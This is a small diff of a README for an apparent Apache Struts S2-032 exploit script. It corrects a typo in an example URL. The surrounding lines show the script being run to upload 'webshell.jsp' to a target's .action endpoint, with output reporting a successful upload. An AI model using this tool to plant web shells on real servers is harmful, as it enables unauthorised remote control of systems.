@@ -29,6 +29,6 @@ optional arguments:
   
   python s2-032_all.py -f wanger.txt -d webshell.jsp --url http://localhost/hello.action<br>
   File upload success!<br>
-  http://loacalhost/webshell.jsp<br>
+  http://localhost/webshell.jsp<br>
   
 
